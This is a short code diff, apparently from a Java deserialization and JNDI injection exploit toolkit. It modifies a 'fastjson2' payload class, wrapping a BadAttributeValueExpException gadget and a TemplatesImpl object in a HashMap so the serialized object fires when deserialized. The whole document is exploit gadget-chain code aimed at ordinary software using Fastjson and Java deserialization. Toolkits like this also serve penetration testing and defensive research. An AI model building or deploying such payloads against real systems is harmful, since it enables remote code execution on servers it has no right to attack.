@@ -11,6 +11,7 @@ import javassist.CtConstructor;
 
 import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Field;
+import java.util.HashMap;
 
 import static com.qi4l.jndi.Starter.JYsoMode;
 
@@ -39,6 +40,9 @@ public class fastjson2 implements ObjectPayload<Object> {
         Field                         valfield = val.getClass().getDeclaredField("val");
         valfield.setAccessible(true);
         valfield.set(val, jsonArray);
-        return val;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(templates, val);
+        return hashMap;
     }
 }
